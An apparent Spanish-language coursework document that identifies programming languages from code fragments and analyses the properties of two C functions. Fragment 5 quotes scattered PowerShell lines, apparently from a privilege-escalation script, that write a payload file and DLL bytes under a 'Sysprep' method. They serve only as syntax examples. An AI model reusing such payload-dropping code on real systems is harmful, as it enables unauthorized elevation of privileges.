<li>La declaración corta <code>short variable declaration</code> con <code>:=</code> es una <strong>característica distintiva de Go.</strong></li>
</ul>
<hr>
<h3 id="uso-de-make-para-mapas"><strong>Uso de make para mapas</strong></h3>
<pre class="hljs"><code><div>make(map[string]Image)
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>make</code> es una <strong>función predefinida de Go (builtin)</strong> que sirve específicamente para inicializar mapas, canales y slices.</li>
</ul>
<hr>
<h3 id="conversi%C3%B3n-de-tipos-al-estilo-go"><strong>Conversión de tipos al estilo Go</strong></h3>
<pre class="hljs"><code><div>Image{uint64(s), uint64(si)}
</div></code></pre>
<p>donde:</p>
<ul>
<li><strong>En Go</strong> las conversiones se escriben como llamadas de función: <code>uint64(...)</code>.</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h3 id="uso-de-nil-como-valor-nulo"><strong>Uso de nil como valor nulo</strong></h3>
<pre class="hljs"><code><div>return ret, nil
</div></code></pre>
<p>donde:</p>
<ul>
<li><strong>En Go</strong>, <code>nil</code> representa el <code>valor cero</code> para ciertos tipos de referencia (punteros, interfaces, mapas, slices, canales y funciones) y significa <code>no hay valor / no apunta a nada</code>.</li>
</ul>
<hr>
<h3 id="conclusi%C3%B3n-del-trozo-1"><strong>Conclusión del trozo 1</strong></h3>
<p><strong><mark>Este trozo está en Go (Golang)</mark></strong> porque los tipos de retorno van después de los paréntesis para definir funciones, devuelve <code>map[string]Image</code>, inicializa mapas con <code>make</code>, utiliza la asignación corta <code>:=</code> y las conversiones de tipo explícitas <code>uint64(...)</code>, elementos característicos de Go y no presentes juntos en otros lenguajes de alto nivel y compilado.</p>
<ul>
<li>Es un lenguaje de alto nivel.</li>
<li>Usa un tipado estático <code>(map[string]Image, error, uint64, etc.)</code>.</li>
<li>Es compilado. El código fuente de Go se traduce mediante el compilador go build directamente a código máquina.</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h2 id="trozo-2"><strong>Trozo 2</strong></h2>
<p><img src="capturas/trozo-2.png" alt="Trozo 1"></p>
<h3 id="la-cabecera-de-la-clase"><strong>La cabecera de la clase</strong></h3>
<pre class="hljs"><code><div>export default class Encoder {
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>export default</code> es sintaxis de módulos <code>ES6 (JS/TS)</code>, que forma parte de JavaScript.</li>
<li><code>export default class Encoder</code> junto con anotaciones de tipo (<code>value: number</code>, <code>bytes: Uint8Array | Buffer | number[]</code>). Esa mezcla de módulos <code>ES6 + tipos estáticos</code> <strong>apunta claramente a TypeScript.</strong></li>
</ul>
<hr>
<h3 id="anotaciones-de-tipos-exclusivos-de-typescript"><strong>Anotaciones de tipos exclusivos de Typescript</strong></h3>
<pre class="hljs"><code><div>data: number[] = []
pushByte(value: number) {
pushInt(value: number, n: number, littleEndian=false) {
pushBytes(bytes: Uint8Array | Buffer | number[]) {
</div></code></pre>
<p>donde:</p>
<ul>
<li>El uso de tipos unidos con <code>| (Uint8Array | Buffer | number[])</code> y de tipos primitivos en los parámetros (<code>n: number, littleEndian=false</code>) <strong>es sintaxis típica de TypeScript para tipado estático.​​</strong></li>
</ul>
<hr>
<h3 id="uso-de-javascript"><strong>Uso de Javascript</strong></h3>
<pre class="hljs"><code><div>let
const
b =&gt; this.data.push(b).
&gt;&gt;
&amp;
</div></code></pre>
<p>donde:</p>
<ul>
<li>Usos de <code>let</code>, <code>const</code>.</li>
<li>Arrow function: <code>b =&gt; this.data.push(b)</code>.</li>
<li>Operadores bit a bit: <code>&gt;&gt;, &amp; 0xff</code>.</li>
</ul>
<hr>
<h3 id="conclusi%C3%B3n-del-trozo-2"><strong>Conclusión del trozo 2</strong></h3>
<p><strong><mark>Este trozo usa JavaScript moderno, y la combinación “JS + anotaciones de tipo” es precisamente lo que demuestra el uso de TypeScript.</mark></strong></p>
<ul>
<li>Es un lenguaje de alto nivel.</li>
<li>Tiene tipado estático (aunque se borra al compilar a JS).</li>
<li>TypeScript se considera un lenguaje compilado, o más precisamente <code>transpilado</code>.
<ul>
<li>El código TypeScript no se ejecuta directamente en el navegador ni en Node; primero pasa por un compilador (tsc) que lo convierte a JavaScript estándar.</li>
<li>El resultado de esa compilación es JavaScript, y ese JavaScript sí se ejecuta de forma interpretada (o JIT‑compilada) por el motor correspondiente.</li>
</ul>
</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h2 id="trozo-3"><strong>Trozo 3</strong></h2>
<p><img src="capturas/trozo-3.png" alt="Trozo 1"></p>
<h3 id="directiva-al-principio"><strong>Directiva al principio</strong></h3>
<pre class="hljs"><code><div>Option Explicit
</div></code></pre>
<p>donde:</p>
<ul>
<li><strong>Es muy típica de VB/VBA</strong> para obligar a declarar variables.</li>
</ul>
<hr>
<h3 id="definici%C3%B3n-de-procedimientos"><strong>Definición de procedimientos</strong></h3>
<pre class="hljs"><code><div>Sub PDF2Workbook()
...
End Sub
</div></code></pre>
<p>donde:</p>
<ul>
<li>El uso de <code>Sub</code> ... <code>End Sub</code> para procedimientos es <strong>propio de Visual Basic.</strong></li>
</ul>
<hr>
<h3 id="llamada-a-m%C3%A9todos-de-la-aplicaci%C3%B3n-host"><strong>Llamada a métodos de la aplicación host</strong></h3>
<pre class="hljs"><code><div>Application.Run &quot;PDFTables2Workbook&quot;, , True
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>Application.Run</code> es <strong>típico en VBA dentro de Excel/Word.</strong></li>
</ul>
<hr>
<h3 id="cuadros-de-mensaje-y-constantes-vb"><strong>Cuadros de mensaje y constantes vb</strong></h3>
<pre class="hljs"><code><div>MsgBox PDFTablesPages, vbOKOnly + vbInformation, &quot; PDFTables&quot;
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>MsgBox</code> y constantes como <code>vbOKOnly</code>, <code>vbInformation</code>, <code>vbNullString</code> <strong>son constantes predefinidas de VBA.</strong></li>
</ul>
<hr>
<h3 id="firma-de-procedimiento-con-optional-byval-as-tipo"><strong>Firma de procedimiento con Optional, ByVal, As Tipo</strong></h3>
<pre class="hljs"><code><div>ub PDFTables2Workbook(Optional ByVal InitialFolderFile As String = vbNullString, _
                       Optional ByVal AllowMultiSelect As Boolean = False)
</div></code></pre>
<p>donde:</p>
<ul>
<li>Esta <strong>Sintaxis es característica de Visual Basic/VBA.</strong></li>
</ul>
<hr>
<h3 id="conclusi%C3%B3n-del-trozo-3"><strong>Conclusión del trozo 3</strong></h3>
<p><strong><mark>Es Visual Basic for Applications (VBA)</strong></mark> porque usa la directiva <code>Option Explicit</code>, define procedimientos con <code>Sub ... End Sub</code>, utiliza parámetros <code>Optional ByVal ... As String/Boolean</code> y constantes predefinidas como <code>vbNullString y vbInformation</code>, todo ello típico de Visual Basic for Applications en macros de Office.</p>
<ul>
<li>Es un lenguaje de alto nivel.</li>
<li>VBA usa un tipado estático:
<ul>
<li>Si declaramos <code>Dim x As String o Dim y As Boolean</code>, el tipo de esa variable queda fijado y el compilador comprueba compatibilidad de tipos.</li>
<li><code>Option Explicit</code> obliga a declarar las variables antes de usarlas.</li>
</ul>
</li>
<li>En el contexto de VBA (macros de Office) se compila a <code>p-code</code> y lo ejecuta el intérprete de VBA dentro de la aplicación. A efectos prácticos en esta clasificación se suele considerar interpretado (no se produce un binario nativo independiente), pero realmente es <strong>compilado a bytecode e interpretado por el runtime de Office</strong>.</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h2 id="trozo-4"><strong>Trozo 4</strong></h2>
<p><img src="capturas/trozo-4.png" alt="Trozo 1"></p>
<h3 id="la-definici%C3%B3n-de-la-funci%C3%B3n"><strong>La definición de la función</strong></h3>
<pre class="hljs"><code><div>long uv__idna_toascii(const char* s, const char* se, char* d, char* de) {
</div></code></pre>
<p>donde:</p>
<ul>
<li>El Tipo de retorno al principio <code>(long)</code> y el uso de parámetros con <strong>tipos clásicos de C</strong> <code>(const char*)</code>.</li>
<li>No hay clases, ni namespace, ni referencias (&amp; en parámetros), tampoco aparece referencias a orientación a objetos → <strong>parece más C que C++.</strong></li>
</ul>
<hr>
<h3 id="declaraciones-de-variables-locales"><strong>Declaraciones de variables locales</strong></h3>
<pre class="hljs"><code><div>const char* si;
const char* st;
unsigned c;
char* ds;
int rc;
</div></code></pre>
<p>donde:</p>
<ul>
<li>Uso de punteros <code>(char*)</code> y del tipo <code>unsigned</code>, <strong>muy típico en código C.</strong></li>
</ul>
<hr>
<h3 id="estructura-del-bucle-y-llamada-a-funci%C3%B3n"><strong>Estructura del bucle y llamada a función</strong></h3>
<pre class="hljs"><code><div>while (si &lt; se) {
    st = si;
    c = uv__utf8_decode1(&amp;si, se);
    if (c == -1u)
        return UV_EINVAL;
}
</div></code></pre>
<p>donde:</p>
<ul>
<li>Sintaxis de control <code>(while, if)</code> <strong>típica de la familia C.</strong></li>
<li>Macros estilo <code>UV_EINVAL</code> <strong>también son muy de C</strong> (constantes definidas con <code>#define</code>).</li>
</ul>
<hr>
<h3 id="conclusi%C3%B3n-del-trozo-4"><strong>Conclusión del trozo 4</strong></h3>
<p><strong><mark>Es C porque declara funciones y variables con tipos primitivos</strong></mark> <code>(long, unsigned, int)</code> y punteros <code>(const char*)</code>, usa un <code>while</code> con comparación de punteros, llama a funciones con paso de direcciones <code>(&amp;si)</code> <strong><mark>y no aparece ninguna característica propia de C++ como referencias, new, class o namespace.</strong></mark></p>
<ul>
<li>Es código de alto nivel, lenguaje C.</li>
<li>C tiene tipado estático: todos los identificadores tienen tipo en tiempo de compilación (<code>long</code>, <code>int</code>, <code>char*</code>, <code>unsigned</code>, …).</li>
<li>C es un lenguaje compilado: se traduce a código máquina (normalmente a través de un compilador como gcc, clang, etc.).</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h2 id="trozo-5"><strong>Trozo 5</strong></h2>
<p><img src="capturas/trozo-5.png" alt="Trozo 1"></p>
<h3 id="cmdlets-con-guiones-y-par%C3%A1metros-con-el-s%C3%ADmbolo-gui%C3%B3n"><strong>Cmdlets con guiones y parámetros con el símbolo guión</strong></h3>
<pre class="hljs"><code><div>Out-File -FilePath $PayloadPath -InputObject $Payload -Encoding ascii
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>Out-File</code>, <code>Get-WmiObject</code>, <code>Write-Output</code>, <code>Write-Verbose</code> son <code>cmdlets</code> <strong>típicos de PowerShell.</strong></li>
</ul>
<hr>
<h3 id="variables-con-el-s%C3%ADmbolo--delante"><strong>Variables con el símbolo $ delante</strong></h3>
<pre class="hljs"><code><div>$PayloadPath
$OSVersion = (Get-WmiObject -Class win32_OperatingSystem).BuildNumber
</div></code></pre>
<p>donde:</p>
<ul>
<li>Las variables con prefijo <code>$</code> (<code>$OSVersion, $PayloadPath, $env:temp</code>) <strong>son características de PowerShell.</strong></li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h3 id="uso-de-switch-con-strings-entre-comillas"><strong>Uso de switch con strings entre comillas</strong></h3>
<pre class="hljs"><code><div>switch($method)
{
    &quot;Sysprep&quot;
    {
        ...
    }
}
</div></code></pre>
<p>donde:</p>
<ul>
<li>Sigue la <strong>gramática propia de PowerShell.</strong></li>
</ul>
<hr>
<h3 id="operador-match-para-expresiones-regulares"><strong>Operador match para expresiones regulares</strong></h3>
<pre class="hljs"><code><div>if ($OSVersion -match &quot;76&quot;)
</div></code></pre>
<p>donde:</p>
<ul>
<li>Sigue la <strong>gramática propia de PowerShell.</strong></li>
</ul>
<hr>
<h3 id="tipos-net-entre-corchetes-y-llamadas-est%C3%A1ticas"><strong>Tipos .NET entre corchetes y llamadas estáticas</strong></h3>
<pre class="hljs"><code><div>[Byte[]] $temp = $DllBytes -split ' '
[System.IO.File]::WriteAllBytes($PathToDll, $temp)
</div></code></pre>
<p>donde:</p>
<ul>
<li>Muestran la <strong>integración directa de PowerShell con .NET</strong>, algo distintivo frente a otros shells.</li>
</ul>
<hr>
<h3 id="conclusi%C3%B3n-del-trozo-5"><strong>Conclusión del trozo 5</strong></h3>
<p><strong><mark>Concluimos que este trozo está escrito en PowerShell.</strong></mark></p>
<ul>
<li>Es un lenguaje de alto nivel, script de PowerShell.</li>
<li>PowerShell usa tipado dinámico, aunque permite anotar tipos como <code>[Byte[]]</code>. Por defecto el sistema es dinámicamente tipado y resuelve tipos en tiempo de ejecución, no en compilación.</li>
<li>Se considera un lenguaje interpretado / de scripting: el motor de PowerShell ejecuta el script directamente, sobre .NET.</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h1 id="ejercicio-2---an%C3%A1lisis-de-funciones"><strong>Ejercicio 2 - Análisis de Funciones</strong></h1>
<ul>
<li>
<p>Describe que hace la función.</p>
</li>
<li>
<p>Define si es función o procedimiento.</p>
</li>
<li>
<p>Define el tipo de la función.</p>
</li>
<li>
<p>¿Es o no es predicado?</p>
</li>
<li>
<p>¿Es o no es una función hoja?</p>
</li>
<li>
<p>¿Es o no es una función de sistema?</p>
</li>
<li>
<p>¿Es o no es una función con parámetros variables?</p>
</li>
<li>
<p>Describe la signatura de la función.</p>
<ul>
<li>Define los tipos de parámetros que recibe.</li>
<li>Define si una parámetros por defecto y qué valores poseen.</li>
<li>Define que tipo de dato devuelve.</li>
<li>Los parámetros que usa la función están pasado por valor o por referencia?</li>
</ul>
</li>
<li>
<p>Define que devuelve la función.</p>
</li>
<li>
<p>Define si llama a otras funciones.</p>
</li>
<li>
<p>Define si modifica algún parámetro o solo lee los valores recibidos?.</p>
</li>
<li>
<p>Define si devuelve un objeto creado dentro de ella.</p>
</li>
<li>
<p>Define si modifica objetos globales.</p>
</li>
<li>
<p>Define el Sistema de tipos usados, son dinámicos, son estáticos.</p>
</li>
<li>
<p>Funciones que importa o exporta. ¿Cómo el programa importa/exporta funciones de una librería? Mediante</p>
<ul>
<li>Enlace dinámico.</li>
<li>Enlace estático.</li>
<li>Carga dinámica, durante la ejecución.</li>
</ul>
</li>
<li>
<p>¿Es una función de usuario?</p>
</li>
<li>
<p>¿es una función que no cambia el estado del programa, es decir tiene transparencia referencial?</p>
</li>
<li>
<p>¿Es una función pura?</p>
</li>
<li>
<p>¿cual es el ámbito de la función (su visibilidad)?</p>
</li>
<li>
<p>Define las variables que usa, son globales? son locales? son estáticas?</p>
</li>
<li>
<p>Si muta o lee valores fuera de su ámbito. Es decir, valores no creados dentro de la función o que no forman parte de los parámetros de la función.</p>
</li>
<li>
<p>¿Posee o no parámetros constantes?</p>
</li>
<li>
<p>tiene runtime?</p>
</li>
<li>
<p>tiene símbolos de depuración?</p>
</li>
<li>
<p>estamos en un modulo? una dll?</p>
</li>
<li>
<p>Definir el ámbito: estamos en un modulo? una función?</p>
</li>
<li>
<p>Explicar estructuras de bifurcación, repetición, saltos...</p>
</li>
</ul>
<h2 id="funci%C3%B3n-1"><strong>Función 1</strong></h2>
<p><img src="capturas/funcion-1.png" alt="funcion-1"></p>
<div style="page-break-before: always;"></div>
<pre class="hljs"><code><div>int aeResizeSetSize(aeEventLoop *eventLoop, int setsize) {
    int i;

    if (setsize == eventLoop-&gt;setsize) return AE_OK;
    if (eventLoop-&gt;maxfd &gt;= setsize) return AE_ERR;
    if (aeApiResize(eventLoop,setsize) == -1) return AE_ERR;

    eventLoop-&gt;events = zrealloc(eventLoop-&gt;events,sizeof(aeFileEvent)*setsize);
    eventLoop-&gt;fired = zrealloc(eventLoop-&gt;fired,sizeof(aeFiredEvent)*setsize);
    eventLoop-&gt;setsize = setsize;

    /* Make sure that if we created new slots, they are initialized with
     * an AE_NONE mask. */
    for (i = eventLoop-&gt;maxfd+1; i &lt; setsize; i++)
        eventLoop-&gt;events[i].mask = AE_NONE;
    return AE_OK;
}
</div></code></pre>
<h3 id="1-identificaci%C3%B3n-y-prop%C3%B3sito-de-la-funci%C3%B3n-1"><strong>1. Identificación y propósito de la Función 1</strong></h3>
<ul>
<li><strong>Nombre:</strong> <code>aeResizeSetSize</code>.</li>
<li><strong>Contexto:</strong> función C relacionada con un bucle de eventos <code>aeEventLoop</code>.</li>
<li><strong>Descripción:</strong> La función <code>aeResizeSetSize</code> se encarga de redimensionar la capacidad del bucle de eventos (<code>eventLoop</code>). Intenta expandir los arrays que almacenan los eventos registrados y los eventos disparados (<code>events</code> y <code>fired</code>) para acomodar un nuevo tamaño (<code>setsize</code>). Si la redimensión es exitosa, inicializa las nuevas ranuras (<code>slots</code>) creadas con una máscara vacía (<code>AE_NONE</code>).</li>
</ul>
<h3 id="2-naturaleza-de-la-funci%C3%B3n-de-la-funci%C3%B3n-1"><strong>2. Naturaleza de la función de la Función 1</strong></h3>
<ul>
<li><strong>Clasificación:</strong> Es una función porque devuelve un valor (<code>int</code>) usado típicamente como código de error/éxito.
<ul>
<li>Aunque retorna int, su valor principal reside en los efectos secundarios (modificar el <code>eventLoop</code>), no en el cálculo de un valor.</li>
<li>Tiene efectos secundarios significativos, es decir, modifica el estado del programa. Por lo que <strong>actúa semánticamente como un procedimiento que devuelve un código de error.</strong></li>
</ul>
</li>
<li><strong>Origen:</strong> Función de usuario, no forma parte de la biblioteca estándar del lenguaje. No es una función de sistema. Es código definido por el programador (o la librería), no una llamada directa al kernel del sistema operativo.</li>
<li><strong>¿Predicado?</strong> No estrictamente; devuelve un código de error/éxito, no un booleano puro. Un predicado suele devolver un booleano (verdadero/falso) evaluando una condición lógica.</li>
<li><strong>¿Función hoja?</strong> No. Llama a otras funciones: <code>aeApiResize</code> y <code>zrealloc</code>. Por lo tanto, no es una leaf function en el árbol de llamadas.</li>
</ul>
<h3 id="3-signatura-y-par%C3%A1metros-de-la-funci%C3%B3n-1"><strong>3. Signatura y parámetros de la Función 1</strong></h3>
<ul>
<li>
<p><strong>Signatura:</strong> <code>int aeResizeSetSize(aeEventLoop *eventLoop, int setsize)</code></p>
</li>
<li>
<p><strong>Aridad:</strong> 2 parámetros → función binaria.</p>
</li>
<li>
<p><strong>Parámetros:</strong></p>
<ul>
<li>
<p><code>eventLoop</code>:</p>
<ul>
<li>Tipo: <code>aeEventLoop *</code>. Un puntero a una estructura <code>aeEventLoop</code>.</li>
<li>Paso: por valor, pero es un puntero → permite modificar la estructura apuntada.</li>
<li>No está declarado <code>const</code>.</li>
<li>Mutabilidad: Se modifica intensivamente (punteros internos y metadatos).</li>
</ul>
</li>
<li>
<p><code>setsize</code>:</p>
<ul>
<li>Tipo: <code>int</code>. Un entero que representa el nuevo tamaño deseado.</li>
<li>Paso: Por valor.</li>
<li>Tampoco está declarado <code>const</code>, aunque en la práctica no se modifica.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>No hay palabra clave <code>const</code> en ninguno.</strong></p>
</li>
<li>
<p><strong>No tiene parámetros por defecto.</strong> El lenguaje C no soporta parámetros por defecto. Ambos deben ser provistos al llamar la función.</p>
</li>
<li>
<p><strong>No es una función con parámetros variables.</strong> Tiene un número fijo de argumentos.</p>
</li>
</ul>
<h3 id="4-valor-de-retorno-de-la-funci%C3%B3n-1"><strong>4. Valor de retorno de la Función 1</strong></h3>
<ul>
<li><strong>Tipo devuelto:</strong> <code>int</code>. Entero con signo.</li>
<li><strong>¿Qué devuelve la función?:</strong> Devuelve constantes simbólicas (macros):
<ul>
<li><code>AE_OK</code> → Si la operación fue exitosa.</li>
<li><code>AE_ERR</code> → Si hubo un error. Por:
<ul>
<li><code>setsize</code> demasiado pequeño <code>maxfd &gt;= setsize</code>, o</li>
<li>fallo de <code>aeApiResize</code>.</li>
</ul>
</li>
</ul>
</li>
<li><strong>¿Devuelve un objeto creado dentro de ella?:</strong> No. Solo devuelve un código de estado entero.</li>
</ul>
<h3 id="5-comportamiento-y-efectos-secundarios-de-la-funci%C3%B3n-1"><strong>5. Comportamiento y Efectos secundarios de la Función 1</strong></h3>
<ul>
<li><strong>¿Llama a otras funciones?:</strong> Sí.
<ul>
<li><code>aeApiResize(eventLoop, setsize)</code>.</li>
<li><code>zrealloc(...)</code> Una envoltura de <code>realloc</code>.</li>
</ul>
</li>
<li><strong>¿Modifica algún parámetro o solo lee?:</strong> Modifica el contenido apuntado por el parámetro <code>eventLoop</code>. Específicamente actualiza sus punteros internos (<code>events</code>, <code>fired</code>) y el campo <code>setsize</code>.</li>
<li><strong>¿Modifica objetos globales?:</strong> Técnicamente modifica memoria en el <code>heap</code> (montículo) a través de <code>zrealloc</code>. Si la estructura eventLoop a la que apunta el puntero es global, entonces sí modifica un objeto global.</li>
<li><strong>Muta o lee valores fuera de su ámbito:</strong> Sí. Al acceder a <code>eventLoop-&gt;events y eventLoop-&gt;fired</code>, está mutando memoria que fue asignada fuera del ámbito de esta función específica.</li>
</ul>
<div style="page-break-before: always;"></div>
<h3 id="6-pureza-y-estado-de-la-funci%C3%B3n-1"><strong>6. Pureza y Estado de la Función 1</strong></h3>
<ul>
<li><strong>¿Es una función pura?:</strong> No.
<ul>
<li>Depende de estado externo, el contenido de <code>eventLoop</code>.</li>
<li>Tiene efectos secundarios (modifica <code>eventLoop</code>, realiza asignación de memoria).</li>
</ul>
</li>
<li><strong>Transparencia referencial:</strong> No tiene. No se puede reemplazar la llamada a la función simplemente por su valor de retorno sin perder la lógica de redimensionamiento del sistema.</li>
<li><strong>¿Es una función que no cambia el estado del programa?:</strong> No. Su propósito principal es cambiar el estado del programa (redimensionar estructuras de datos).</li>
</ul>
<h3 id="7-sistema-de-tipos-y-visibilidad-de-la-funci%C3%B3n-1"><strong>7. Sistema de tipos y visibilidad de la Función 1</strong></h3>
<ul>
<li><strong>Lenguaje:</strong> C, tipado estático. Los tipos se verifican en tiempo de compilación.</li>
<li><strong>Los tipos se conocen en compilación:</strong> <code>int</code>, <code>aeEventLoop *</code>, <code>aeFileEvent</code>, <code>aeFiredEvent</code>.</li>
<li><strong>Enlace (Linkage):</strong> Externo (Público).
<ul>
<li>No tiene <code>static</code> delante, así que por defecto tiene enlace externo, visible desde otros archivos si se declara en un <code>header</code>.</li>
</ul>
</li>
</ul>
<h3 id="8-relaciones-con-otras-funciones-y-librer%C3%ADas-de-la-funci%C3%B3n-1"><strong>8. Relaciones con otras funciones y librerías de la Función 1</strong></h3>
<ul>
<li><strong>Llama a:</strong>
<ul>
<li><code>aeApiResize(eventLoop, setsize)</code> → parte dependiente del sistema/implementación del backend de eventos.</li>
<li><code>zrealloc(...)</code> → wrapper de <code>realloc</code>.</li>
</ul>
</li>
<li><strong>No importa/exporta directamente librerías</strong> en el propio código; eso ocurre a nivel de compilación/enlace del módulo donde está definida.</li>
<li><strong>Mecanismo de importación/exportación:</strong> Depende de la compilación. Normalmente, en C, esto se resuelve mediante el Enlace (Linking). Si es parte de un ejecutable monolítico, es enlace estático. Si <code>ae.c</code> se compila en una <code>.dll</code> o <code>.so</code>, se usaría enlace dinámico.</li>
</ul>
<h3 id="9-ejecuci%C3%B3n-y-depuraci%C3%B3n-de-la-funci%C3%B3n-1"><strong>9 Ejecución y depuración de la Función 1</strong></h3>
<ul>
<li>Usa el runtime estándar de C, para memoria dinámica, aunque envuelto en <code>zrealloc</code>.</li>
<li>El fragmento es código fuente; si el binario se compila con símbolos de depuración o no depende de las opciones del compilador, aquí no se ve.</li>
</ul>
<h3 id="10-estructuras-de-control-de-la-funci%C3%B3n-1"><strong>10. Estructuras de control de la Función 1</strong></h3>
<ul>
<li><strong>Bifurcación:</strong>
<ul>
<li>Tres if seguidos con return temprano:
<ul>
<li>Igualdad de tamaños.</li>
<li>Comprobación <code>maxfd &gt;= setsize</code>.</li>
<li>Resultado de <code>aeApiResize</code>.</li>
</ul>
</li>
</ul>
</li>
<li><strong>Repetición:</strong>
<ul>
<li>Un bucle <code>for (i = eventLoop-&gt;maxfd+1; i &lt; setsize; i++)</code>: Inicializa las nuevas posiciones de events con <code>AE_NONE</code>.</li>
</ul>
</li>
<li><strong>Saltos / flujo:</strong>
<ul>
<li><code>return</code> múltiple, salidas tempranas en caso de error o no-cambio.</li>
<li>No hay break, continue, goto, ni manejo de excepciones (en C estándar no hay try/catch).</li>
</ul>
</li>
</ul>
<h3 id="11-an%C3%A1lisis-de-malware--seguridad-de-la-funci%C3%B3n-1"><strong>11. Análisis de malware / seguridad de la Función 1</strong></h3>
<ul>
<li>Desde el punto de vista de malware, esta función no muestra comportamiento típico malicioso.</li>
<li>Conclusión en clave malware: Es una función de infraestructura interna de un event loop (gestión de arrays de eventos). Por sí sola no es indicio de comportamiento malicioso.</li>
</ul>
<hr>
<h2 id="funci%C3%B3n-2"><strong>Función 2</strong></h2>
<p><img src="capturas/funcion-2-ok.png" alt="funcion-2"></p>
<pre class="hljs"><code><div>static int
args_cmp(struct args_entry *a1, struct args_entry *a2)
{
        return (a1-&gt;flag - a2-&gt;flag);
}
</div></code></pre>
<h3 id="1-identificaci%C3%B3n-y-prop%C3%B3sito-de-la-funci%C3%B3n-2"><strong>1. Identificación y propósito de la Función 2</strong></h3>
<ul>
<li><strong>Nombre:</strong> <code>args_cmp</code>.</li>
<li><strong>Contexto:</strong> función C, probablemente usada como función de comparación.</li>
<li><strong>Descripción:</strong> La función <code>args_cmp</code> compara dos estructuras del tipo <code>struct args_entry</code>. Resta el valor del campo flag de la segunda estructura (<code>a2</code>) al de la primera (<code>a1</code>).
<ul>
<li>El propósito de este patrón es servir como función de comparación, típicamente utilizada por algoritmos de ordenamiento como <code>qsort</code> o de búsqueda como <code>bsearch</code>.</li>
<li>Si el resultado es &lt; 0: <code>a1</code> es menor que <code>a2</code>.</li>
<li>Si el resultado es 0: Son iguales.</li>
<li>Si el resultado es &gt; 0: <code>a1</code> es mayor que <code>a2</code>.</li>
</ul>
</li>
</ul>
<h3 id="2-naturaleza-de-la-funci%C3%B3n-de-la-funci%C3%B3n-2"><strong>2. Naturaleza de la función de la Función 2</strong></h3>
<ul>
<li><strong>Clasificación:</strong> Es una función, ya que su objetivo principal es calcular y devolver un valor (<code>int</code>) sin generar efectos secundarios.</li>
<li><strong>Origen:</strong> Función de usuario, no forma parte de la biblioteca estándar. Función auxiliar / Comparador.</li>
<li><strong>¿Predicado?:</strong> No, devuelve un valor de comparación, no un booleano puro.</li>
<li><strong>¿Función hoja?:</strong> Sí. No llama a ninguna otra función; solo hace una operación aritmética.</li>
</ul>
<h3 id="3-signatura-y-par%C3%A1metros-de-la-funci%C3%B3n-2"><strong>3. Signatura y parámetros de la Función 2</strong></h3>
<ul>
<li>
<p><strong>Signatura:</strong> <code>static int args_cmp(struct args_entry *a1, struct args_entry *a2);</code></p>
</li>
<li>
<p><strong>Aridad:</strong> 2 parámetros → función binaria.</p>
</li>
<li>
<p><strong>Parámetros:</strong></p>
<ul>
<li>
<p><code>a1</code>:</p>
<ul>
<li>Tipo: <code>struct args_entry *</code>. Puntero a la primera estructura, <code>LHS - Left Hand Side</code>.</li>
<li>Paso: por valor (puntero), se copian las direcciones de memoria, actuando como referencia a los datos. Evita la copia costosa de toda la estructura.</li>
<li>No es <code>const</code>.</li>
</ul>
</li>
<li>
<p><code>a2</code>:</p>
<ul>
<li>Tipo: <code>struct args_entry *</code>. Puntero a la segunda estructura, <code>RHS - Right Hand Side</code>.</li>
<li>Paso: por valor (puntero), se copian las direcciones de memoria, actuando como referencia a los datos. Evita la copia costosa de toda la estructura.</li>
<li>No es <code>const</code>.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>No hay <code>const</code> en los parámetros.</strong></p>
</li>
<li>
<p><strong>Parámetros por defecto:</strong> No.</p>
</li>
<li>
<p><strong>No es varargs (variadic functions).</strong> Esta función no acepta un número variable de argumentos.</p>
</li>
</ul>
<h3 id="4-valor-de-retorno-de-la-funci%C3%B3n-2"><strong>4. Valor de retorno de la Función 2</strong></h3>
<ul>
<li><strong>Tipo:</strong> <code>int</code>. Entero con signo.</li>
<li><strong>Qué devuelve exactamente:</strong> <code>a1-&gt;flag - a2-&gt;flag</code> → un entero negativo, cero o positivo según la relación de orden entre ambos flag.</li>
<li><strong>No devuelve objetos</strong> ni códigos complejos, solo el resultado de la comparación.</li>
</ul>
<h3 id="5-comportamiento-y-efectos-secundarios-de-la-funci%C3%B3n-2"><strong>5. Comportamiento y Efectos secundarios de la Función 2</strong></h3>
<ul>
<li><strong>Lectura:</strong> Lee memoria del <code>heap/stack</code>.</li>
<li><strong>Escritura:</strong> Ninguna.</li>
<li><strong>Estado Global:</strong> No accede ni modifica nada fuera de sus parámetros.</li>
<li><strong>Conclusión:</strong> Sin efectos secundarios observables.</li>
</ul>
<h3 id="6-pureza-y-estado-de-la-funci%C3%B3n-2"><strong>6. Pureza y Estado de la Función 2</strong></h3>
<ul>
<li>
<p><strong>¿Es una función pura?:</strong> Sí.</p>
<ul>
<li>Su valor de retorno depende exclusivamente de sus argumentos.</li>
<li>No tiene efectos secundarios (no imprime, no escribe en archivos, no modifica variables globales).</li>
</ul>
</li>
<li>
<p><strong>Transparencia referencial:</strong> Sí. Podemos reemplazar la llamada a la función por el resultado de la resta (si tuviéramos acceso a los punteros) y el programa funcionaría igual.</p>
</li>
</ul>
<h3 id="7-sistema-de-tipos-y-visibilidad-de-la-funci%C3%B3n-2"><strong>7. Sistema de tipos y Visibilidad de la Función 2</strong></h3>
<ul>
<li><strong>Lenguaje:</strong> C → tipado estático.</li>
<li><strong>Usa tipos:</strong> <code>int</code>, <code>struct args_entry *</code>.</li>
<li><strong>Enlace (Linkage):</strong> Interno.
<ul>
<li>La palabra clave <code>static</code> restringe la visibilidad al archivo fuente actual.</li>
<li>No puede ser invocada directamente desde otros archivos <code>.c</code>, no se exporta el símbolo.</li>
</ul>
</li>
</ul>
<h3 id="8-relaciones-con-otras-funciones-y-librer%C3%ADas-de-la-funci%C3%B3n-2"><strong>8. Relaciones con otras funciones y librerías de la Función 2</strong></h3>
<ul>
<li>No llama a otras funciones.</li>
